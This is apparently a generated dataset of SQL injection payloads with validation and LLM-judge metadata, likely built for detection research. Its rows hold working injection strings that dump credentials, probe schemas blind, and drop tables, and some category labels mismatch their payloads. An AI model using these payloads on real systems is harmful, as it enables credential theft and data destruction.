query_id,seed_payload,payload,full_query,llm_attack_category,template_context,label,mutation_count,codebert_score,ast_is_valid,ast_dialect,ast_node_set,sandbox_executed,sandbox_detection_mode,sandbox_exploit_type,judge_malicious_intent_preserved,judge_realistic_for_context,judge_non_trivial_mutation,judge_overall_quality_score,judge_keep,judge_reason,backend,status
q00017,,"' OR ASCII(SUBSTRING((SELECT user FROM mysql.user LIMIT 1),1,1))>104 --","SELECT * FROM products WHERE name LIKE '%' OR ASCII(SUBSTRING((SELECT user FROM mysql.user LIMIT 1),1,1))>104 --%'",tautology,search,1,0,0.0,True,default,"[""Or"", ""EQ"", ""Subquery"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""Limit"", ""From"", ""Ascii"", ""Table"", ""Star"", ""GT"", ""Substring"", ""Column""]",True,payload_fragment,blind_time,True,True,True,4,True,"The candidate payload is a valid SQL injection attempt that maintains malicious intent, is realistic for the 'search' context, shows non-trivial mutation from the seed, and has a high quality score.",ollama_local+rules,ok
q00018,,"' OR (SELECT IF(LENGTH(database())=1,TRUE,FALSE)) --","SELECT * FROM products WHERE name LIKE '%' OR (SELECT IF(LENGTH(database())=1,TRUE,FALSE)) --%'",tautology,search,1,0,0.0,True,mysql,"[""Or"", ""EQ"", ""If"", ""Subquery"", ""Literal"", ""Length"", ""Select"", ""Identifier"", ""Where"", ""CurrentSchema"", ""Boolean"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,nested_injection,True,True,True,4,True,"The candidate payload is a tautology attack that is realistic for the search context, shows non-trivial mutation from the seed, and maintains malicious intent.",ollama_local+rules,ok
q00019,,' OR (SELECT 1 FROM users WHERE username='' AND password='') --,SELECT * FROM products WHERE name LIKE '%' OR (SELECT 1 FROM users WHERE username='' AND password='') --%',tautology,search,1,0,0.0,True,default,"[""And"", ""Or"", ""EQ"", ""Subquery"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,comment_obfuscation,True,True,True,4,True,"The candidate payload is a tautology attack that is realistic for the search context, shows non-trivial mutation from the seed, and maintains malicious intent.",ollama_local+rules,ok
q00020,,"%' UNION ALL SELECT 1,2,3,4 --","SELECT * FROM products WHERE name LIKE '%%' UNION ALL SELECT 1,2,3,4 --%'",tautology,search,1,0,0.0,True,default,"[""Union"", ""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,union_based,True,True,True,4,True,The candidate payload is a valid union-based SQL injection attempt that matches the search context and demonstrates non-trivial mutation from the seed payload.,ollama_local+rules,ok
q00041,,"--' UNION SELECT NULL, NULL, NULL, NULL--","SELECT * FROM users WHERE username = '--' UNION SELECT NULL, NULL, NULL, NULL--' AND password = 'anything'",union_based,login,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,4,True,The candidate payload is a union-based SQL injection attempt that matches the login context and demonstrates non-trivial mutation from the seed payload.,ollama_local+rules,ok
q00042,,"' OR '1'='1' UNION ALL SELECT username, password, NULL, NULL FROM another_table --","SELECT * FROM users WHERE username = '' OR '1'='1' UNION ALL SELECT username, password, NULL, NULL FROM another_table --' AND password = 'anything'",union_based,login,1,0,0.0,True,default,"[""Or"", ""Null"", ""EQ"", ""Union"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,tautology,True,True,True,4,True,"The candidate payload is a valid union-based SQL injection attack that maintains malicious intent, is realistic for the login context, and represents a non-trivial mutation from the seed payload.",ollama_local+rules,ok
q00043,,'; DROP TABLE IF EXISTS temp_table; --,SELECT * FROM users WHERE username = ''; DROP TABLE IF EXISTS temp_table; --' AND password = 'anything',union_based,login,1,0,0.0,True,default,"[""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Semicolon"", ""Drop"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,stacked_queries,True,True,True,4,True,"The candidate payload contains a union-based SQL injection attack in the login context, with a non-trivial mutation from the seed payload, and is realistic for the login scenario.",ollama_local+rules,ok
q00044,,' OR EXISTS(SELECT * FROM information_schema.tables WHERE table_name='admin')--,SELECT * FROM users WHERE username = '' OR EXISTS(SELECT * FROM information_schema.tables WHERE table_name='admin')--' AND password = 'anything',union_based,login,1,0,0.0,True,default,"[""Or"", ""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Table"", ""Exists"", ""Star"", ""Column""]",True,payload_fragment,blind_time,True,True,True,4,True,"The candidate payload is a union-based SQL injection attack in the login context, with non-trivial mutation and realistic for the target application.",ollama_local+rules,ok
q00045,,"' UNION SELECT CONCAT(username, ':', password) AS credentials FROM users --","SELECT * FROM users WHERE username = '' UNION SELECT CONCAT(username, ':', password) AS credentials FROM users --' AND password = 'anything'",union_based,login,1,0,0.0,True,default,"[""Union"", ""EQ"", ""Literal"", ""Concat"", ""Select"", ""Identifier"", ""Where"", ""Alias"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,blind_boolean,True,True,True,4,True,The candidate payload is a union-based SQL injection attack that matches the login context and demonstrates non-trivial mutation from the seed payload.,ollama_local+rules,ok
q00046,,"--' UNION SELECT NULL, NULL, (SELECT password FROM admin), NULL--","SELECT * FROM users WHERE username = '--' UNION SELECT NULL, NULL, (SELECT password FROM admin), NULL--' AND password = 'anything'",union_based,login,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,4,True,The candidate payload is a union-based SQL injection attack that matches the login context and demonstrates non-trivial mutation from the seed payload.,ollama_local+rules,ok
q00047,,' OR (SELECT username FROM users WHERE LENGTH(password) > 0) LIMIT 1--,SELECT * FROM users WHERE username = '' OR (SELECT username FROM users WHERE LENGTH(password) > 0) LIMIT 1--' AND password = 'anything',union_based,login,1,0,0.0,True,default,"[""Or"", ""EQ"", ""Subquery"", ""Literal"", ""Length"", ""Select"", ""Identifier"", ""Where"", ""Limit"", ""From"", ""Table"", ""Star"", ""GT"", ""Column""]",True,payload_fragment,nested_injection,True,True,True,4,True,The candidate payload is a valid union-based SQL injection attempt that matches the login context and demonstrates non-trivial mutation from the seed.,ollama_local+rules,ok
q00048,,; SELECT * FROM secret_data WHERE CAST(LENGTH(username) AS VARCHAR) = '1'--,SELECT * FROM users WHERE username = '; SELECT * FROM secret_data WHERE CAST(LENGTH(username) AS VARCHAR) = '1'--' AND password = 'anything',union_based,login,1,0,0.0,True,default,"[""EQ"", ""Literal"", ""Length"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Table"", ""Cast"", ""Star"", ""DataType"", ""Column""]",True,complete_query,comment_obfuscation,True,True,True,4,True,"The candidate payload is a valid union-based SQL injection attempt that maintains malicious intent, is realistic for the login context, and represents a non-trivial mutation from the seed payload.",ollama_local+rules,ok
q00050,,"--' UNION SELECT username, email, password, salt FROM user_details--","SELECT * FROM users WHERE username = '--' UNION SELECT username, email, password, salt FROM user_details--' AND password = 'anything'",union_based,login,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,4,True,"The candidate payload is a union-based SQL injection attack that matches the login context, shows non-trivial mutation from the seed, and is realistic for the login scenario.",ollama_local+rules,ok
q00051,,' OR EXISTS(SELECT * FROM system_tables WHERE table_name='hidden_admin')--,SELECT * FROM users WHERE username = '' OR EXISTS(SELECT * FROM system_tables WHERE table_name='hidden_admin')--' AND password = 'anything',union_based,login,1,0,0.0,True,default,"[""Or"", ""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Table"", ""Exists"", ""Star"", ""Column""]",True,payload_fragment,comment_obfuscation,True,True,True,4,True,"The candidate payload is a union-based SQL injection attack targeting the login context, with non-trivial mutation and realistic for the login scenario.",ollama_local+rules,ok
q00052,,"'; WAITFOR DELAY '0:0:10' UNION ALL SELECT username, password, role FROM staff_members--","SELECT * FROM users WHERE username = ''; WAITFOR DELAY '0:0:10' UNION ALL SELECT username, password, role FROM staff_members--' AND password = 'anything'",union_based,login,1,0,0.0,False,,[],False,static_only,stacked_queries,False,True,True,2,False,malicious intent is not clearly preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes. Rejected by hard rule because AST validation or sandbox execution failed.,heuristic,rejected_pre_judge
q00054,,' OR 1=1 AND EXISTS(SELECT * FROM orders WHERE user_id=1)/*,SELECT * FROM products WHERE name LIKE '%' OR 1=1 AND EXISTS(SELECT * FROM orders WHERE user_id=1)/*%',union_based,search,1,0,0.0,False,,[],False,static_only,tautology,False,True,True,2,False,malicious intent is not clearly preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes. Rejected by hard rule because AST validation or sandbox execution failed.,heuristic,rejected_pre_judge
q00055,,"1' UNION SELECT username, password FROM admin--","SELECT * FROM products WHERE name LIKE '%1' UNION SELECT username, password FROM admin--%'",union_based,search,1,0,0.0,True,default,"[""Union"", ""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,blind_boolean,True,True,True,4,True,The candidate payload is a valid union-based SQL injection attempt that matches the search context and demonstrates non-trivial mutation from the seed payload.,ollama_local+rules,ok
q00056,,"' AND (SELECT 1 FROM (UNION SELECT 1, COUNT(*), 1 FROM employees GROUP BY department)) --","SELECT * FROM products WHERE name LIKE '%' AND (SELECT 1 FROM (UNION SELECT 1, COUNT(*), 1 FROM employees GROUP BY department)) --%'",union_based,search,1,0,0.0,False,,[],False,static_only,union_based,False,True,True,2,False,malicious intent is not clearly preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes. Rejected by hard rule because AST validation or sandbox execution failed.,heuristic,rejected_pre_judge
q00057,,"--' OR 1=1 UNION ALL SELECT username, email FROM customers/*","SELECT * FROM products WHERE name LIKE '%--' OR 1=1 UNION ALL SELECT username, email FROM customers/*%'",union_based,search,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,4,True,"The candidate payload is a union-based SQL injection attack that matches the search context, shows non-trivial mutation from the seed, and is realistic for the application.",ollama_local+rules,ok
q00058,,' OR EXISTS(SELECT * FROM suppliers WHERE contact_name LIKE '%admin%')--,SELECT * FROM products WHERE name LIKE '%' OR EXISTS(SELECT * FROM suppliers WHERE contact_name LIKE '%admin%')--%',union_based,search,1,0,0.0,True,default,"[""Or"", ""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Like"", ""Table"", ""Exists"", ""Star"", ""Column""]",True,payload_fragment,tautology,True,True,True,4,True,"The candidate payload is a union-based SQL injection attack that is plausible for the 'search' context, shows non-trivial mutation from the seed, and maintains malicious intent.",ollama_local+rules,ok
q00059,,"' AND 1=(SELECT CASE WHEN SUBSTRING((SELECT username FROM admin LIMIT 0,1),1,1)='a' THEN 1 ELSE 2 END) OR '1'='1'","SELECT * FROM products WHERE name LIKE '%' AND 1=(SELECT CASE WHEN SUBSTRING((SELECT username FROM admin LIMIT 0,1),1,1)='a' THEN 1 ELSE 2 END) OR '1'='1'%'",union_based,search,1,0,0.0,True,default,"[""And"", ""Case"", ""Or"", ""EQ"", ""If"", ""Subquery"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""Offset"", ""Limit"", ""From"", ""Table"", ""Star"", ""Substring"", ""Column""]",True,payload_fragment,tautology,True,True,True,4,True,"The candidate payload is a valid union-based SQL injection attack that maintains malicious intent, is realistic for the 'search' context, and represents a non-trivial mutation from the seed payload.",ollama_local+rules,ok
q00060,,' OR (SELECT LENGTH((SELECT password FROM admin WHERE admin_id=1))) > 0#,SELECT * FROM products WHERE name LIKE '%' OR (SELECT LENGTH((SELECT password FROM admin WHERE admin_id=1))) > 0#%',union_based,search,1,0,0.0,True,mysql,"[""Or"", ""EQ"", ""Subquery"", ""Literal"", ""Length"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Table"", ""Star"", ""GT"", ""Column""]",True,payload_fragment,nested_injection,True,True,True,4,True,"The candidate payload is a union-based SQL injection attack that is plausible for the 'search' context, shows non-trivial mutation from the seed, and maintains malicious intent.",ollama_local+rules,ok
q00061,,"--' UNION SELECT table_schema, table_name FROM information_schema.tables WHERE table_type = 'BASE TABLE'","SELECT * FROM products WHERE name LIKE '%--' UNION SELECT table_schema, table_name FROM information_schema.tables WHERE table_type = 'BASE TABLE'%'",union_based,search,1,0,0.0,True,default,[],True,complete_query,blind_boolean,True,True,True,4,True,"The candidate payload is a valid union-based SQL injection attack that is plausible in the search context, shows non-trivial mutation from the seed, and maintains malicious intent.",ollama_local+rules,ok
q00062,,"' OR (SELECT 1 FROM (UNION SELECT 1, COUNT(*), 1 FROM products GROUP BY price HAVING COUNT(*) > 1))","SELECT * FROM products WHERE name LIKE '%' OR (SELECT 1 FROM (UNION SELECT 1, COUNT(*), 1 FROM products GROUP BY price HAVING COUNT(*) > 1))%'",union_based,search,1,0,0.0,False,,[],False,static_only,union_based,False,True,True,2,False,malicious intent is not clearly preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes. Rejected by hard rule because AST validation or sandbox execution failed.,heuristic,rejected_pre_judge
q00094,,--' OR 1=1; --,SELECT * FROM users WHERE username = '--' OR 1=1; --' AND password = 'anything',blind_boolean,login,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,4,True,"The candidate payload is a valid blind boolean attack in the login context, showing non-trivial mutation from the seed, and is realistic for the given context.",ollama_local+rules,ok
q00095,,"'; /**/ IF(1=1, SLEEP(5), NULL);/**/","SELECT * FROM users WHERE username = ''; /**/ IF(1=1, SLEEP(5), NULL);/**/' AND password = 'anything'",blind_boolean,login,1,0,0.0,True,default,"[""Null"", ""EQ"", ""If"", ""Anonymous"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Semicolon"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,blind_boolean,True,True,True,4,True,The candidate payload is a meaningful malicious SQL injection attempt that matches the blind_boolean attack category and is plausible in the login context.,ollama_local+rules,ok
q00096,,"'"" OR 1=1/*","SELECT * FROM users WHERE username = ''"" OR 1=1/*' AND password = 'anything'",blind_boolean,login,1,0,0.0,False,,[],False,static_only,tautology,False,True,True,2,False,malicious intent is not clearly preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes. Rejected by hard rule because AST validation or sandbox execution failed.,heuristic,rejected_pre_judge
q00097,,"; --' OR ASCII(SUBSTRING(password, 1, 1)) > 50 --","SELECT * FROM users WHERE username = '; --' OR ASCII(SUBSTRING(password, 1, 1)) > 50 --' AND password = 'anything'",blind_boolean,login,1,0,0.0,True,default,"[""Semicolon""]",True,complete_query,comment_obfuscation,True,True,True,4,True,The candidate payload is a meaningful malicious SQL injection attempt that matches the login context and is a non-trivial mutation from the seed payload.,ollama_local+rules,ok
q00098,,"' OR EXISTS(SELECT 1 FROM (SELECT CASE WHEN (ASCII(SUBSTRING(username, 1, 1)) > 97) THEN 1 ELSE 0 END AS res) WHERE res = 1)","SELECT * FROM users WHERE username = '' OR EXISTS(SELECT 1 FROM (SELECT CASE WHEN (ASCII(SUBSTRING(username, 1, 1)) > 97) THEN 1 ELSE 0 END AS res) WHERE res = 1)' AND password = 'anything'",blind_boolean,login,1,0,0.0,True,default,"[""Case"", ""Or"", ""If"", ""Identifier"", ""Star"", ""Paren"", ""Literal"", ""From"", ""Ascii"", ""Substring"", ""Table"", ""Exists"", ""GT"", ""Column"", ""EQ"", ""Subquery"", ""Select"", ""Alias"", ""Where""]",True,payload_fragment,tautology,True,True,True,4,True,"The candidate payload is a valid blind boolean attack in the login context, with non-trivial mutation from the seed, and maintains malicious intent.",ollama_local+rules,ok
q00099,,"--' OR CHAR_LENGTH((SELECT SUBSTRING(password, 1, 1) FROM users LIMIT 1)) > 0 --","SELECT * FROM users WHERE username = '--' OR CHAR_LENGTH((SELECT SUBSTRING(password, 1, 1) FROM users LIMIT 1)) > 0 --' AND password = 'anything'",blind_boolean,login,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,4,True,"The candidate payload is a valid blind boolean attack in the login context, showing non-trivial mutation from the seed and maintaining malicious intent.",ollama_local+rules,ok
q00100,,' OR (SELECT COUNT(*) FROM tables WHERE table_schema = DATABASE() AND table_name = 'users') > 0,SELECT * FROM users WHERE username = '' OR (SELECT COUNT(*) FROM tables WHERE table_schema = DATABASE() AND table_name = 'users') > 0' AND password = 'anything',blind_boolean,login,1,0,0.0,True,mysql,"[""And"", ""Or"", ""EQ"", ""Subquery"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""CurrentSchema"", ""Count"", ""From"", ""Table"", ""Star"", ""GT"", ""Column""]",True,payload_fragment,nested_injection,True,True,True,4,True,The candidate payload is a valid blind boolean injection attempt that maintains malicious intent and is realistic for a login context.,ollama_local+rules,ok
q00102,,' OR EXISTS(SELECT 1 FROM users WHERE username LIKE 'a%' AND LENGTH(password) = 1),SELECT * FROM users WHERE username = '' OR EXISTS(SELECT 1 FROM users WHERE username LIKE 'a%' AND LENGTH(password) = 1)' AND password = 'anything',blind_boolean,login,1,0,0.0,True,default,"[""And"", ""Or"", ""EQ"", ""Literal"", ""Length"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Like"", ""Table"", ""Exists"", ""Star"", ""Column""]",True,payload_fragment,tautology,True,True,True,4,True,"The candidate payload is a valid blind boolean attack in the login context, showing non-trivial mutation from the seed and maintaining malicious intent.",ollama_local+rules,ok
q00103,,"--' OR (SELECT 1 FROM users WHERE id = 1 AND (SELECT 1 FROM (SELECT CASE WHEN ASCII(SUBSTRING(password, 1, 1)) <= 50 THEN 1 ELSE 0 END AS res) WHERE res = 0))""","SELECT * FROM users WHERE username = '--' OR (SELECT 1 FROM users WHERE id = 1 AND (SELECT 1 FROM (SELECT CASE WHEN ASCII(SUBSTRING(password, 1, 1)) <= 50 THEN 1 ELSE 0 END AS res) WHERE res = 0))""' AND password = 'anything'",blind_boolean,login,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,4,True,"The candidate payload is a valid SQL injection attempt that maintains malicious intent, is realistic for the login context, and represents a non-trivial mutation from the seed payload.",ollama_local+rules,ok
q00104,,"OR '1'='1';/**/"" + String.fromCharCode(10) + ""--""","SELECT * FROM users WHERE username = 'OR '1'='1';/**/"" + String.fromCharCode(10) + ""--""' AND password = 'anything'",blind_boolean,login,1,0,0.0,True,default,"[""Or"", ""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Semicolon"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,tautology,True,True,True,4,True,The candidate payload is a valid blind boolean attack with non-trivial mutation and realistic context for a login scenario.,ollama_local+rules,ok
q00105,,OR 'admin' LIKE 'admin'; WAITFOR DELAY '0:0:5,SELECT * FROM users WHERE username = 'OR 'admin' LIKE 'admin'; WAITFOR DELAY '0:0:5' AND password = 'anything',blind_boolean,login,1,0,0.0,False,,[],False,static_only,blind_time,False,True,True,2,False,malicious intent is not clearly preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes. Rejected by hard rule because AST validation or sandbox execution failed.,heuristic,rejected_pre_judge
q00106,,"1' AND 8255 IN (SELECT ASCII(SUBSTRING(username, 1, 1)) FROM users)","SELECT * FROM products WHERE name LIKE '%1' AND 8255 IN (SELECT ASCII(SUBSTRING(username, 1, 1)) FROM users)%'",blind_boolean,search,1,0,0.0,True,default,"[""And"", ""EQ"", ""Subquery"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Ascii"", ""In"", ""Table"", ""Star"", ""Substring"", ""Column""]",True,payload_fragment,tautology,True,True,True,4,True,The candidate payload is a meaningful SQL injection attempt that matches the blind boolean attack category and is plausible for the search context.,ollama_local+rules,ok
q00107,,1' AND EXISTS(SELECT * FROM tables WHERE table_name = 'users') --,SELECT * FROM products WHERE name LIKE '%1' AND EXISTS(SELECT * FROM tables WHERE table_name = 'users') --%',blind_boolean,search,1,0,0.0,True,default,"[""And"", ""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Table"", ""Exists"", ""Star"", ""Column""]",True,payload_fragment,comment_obfuscation,True,True,True,4,True,The candidate payload is a meaningful SQL injection attempt that matches the blind boolean attack category and is plausible for the search context.,ollama_local+rules,ok
q00108,,1' AND (SELECT COUNT(*) FROM (SELECT 1 UNION ALL SELECT 2 WHERE CHAR_LENGTH(name) > 1)) > 1 --,SELECT * FROM products WHERE name LIKE '%1' AND (SELECT COUNT(*) FROM (SELECT 1 UNION ALL SELECT 2 WHERE CHAR_LENGTH(name) > 1)) > 1 --%',blind_boolean,search,1,0,0.0,True,default,"[""And"", ""Union"", ""EQ"", ""Subquery"", ""Literal"", ""Length"", ""Select"", ""Identifier"", ""Where"", ""Count"", ""From"", ""Table"", ""Star"", ""GT"", ""Column""]",True,payload_fragment,union_based,True,True,True,4,True,The candidate payload is a valid blind boolean SQL injection attack with non-trivial mutation and realistic context for the 'search' application.,ollama_local+rules,ok
q00109,,"1' AND DBMS_LOB.INSTR(description, 'admin', 1, 1) > 0 --","SELECT * FROM products WHERE name LIKE '%1' AND DBMS_LOB.INSTR(description, 'admin', 1, 1) > 0 --%'",blind_boolean,search,1,0,0.0,True,default,"[""And"", ""EQ"", ""Anonymous"", ""Literal"", ""Select"", ""Identifier"", ""Dot"", ""Where"", ""From"", ""Table"", ""Star"", ""GT"", ""Column""]",True,payload_fragment,comment_obfuscation,True,True,True,4,True,The candidate payload is a meaningful malicious SQL injection attempt that matches the blind boolean attack pattern. It is plausible in the search context and shows non-trivial mutation from the seed payload.,ollama_local+rules,ok
